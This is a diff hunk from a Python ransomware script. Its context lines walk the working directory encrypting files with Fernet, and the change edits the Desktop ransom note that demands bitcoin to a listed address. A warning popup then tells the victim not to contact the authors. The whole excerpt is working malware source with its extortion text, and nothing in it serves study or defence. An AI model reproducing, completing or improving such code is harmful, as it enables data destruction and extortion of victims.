@@ -19,7 +19,7 @@ for dir_tuple in os.walk(os.getcwd()):
             with open(str(file), "wb") as f:
                 f.write(fernet.encrypt(data))
 with open(f"{os.environ.get('HOME')}/Desktop/README.txt","w") as f:
-    f.write("All your files have been encrypted.\nYou can only decrypt them with a key that we have. To get the key transfer ₿20 to bitcoin address 11SAs3HwDkytKNHoOlaMJSoBW4EY3oy5Gm\nexpect us")
+    f.writelines(["All your files have been encrypted.","You can only decrypt them with a key that we have. To get the key transfer BC30 to bitcoin address 11SAs3HwDkytKNHoOlaMJSoBW4EY3oy5Gm","expect us"])
 root = tk.Tk()
 root.withdraw()
 if messagebox.showwarning('???', 'All your files have been encrypted. Check your Desktop for README.txt for further instructions. Do not contact the authors in any way else the decryption key will be deleted.'):
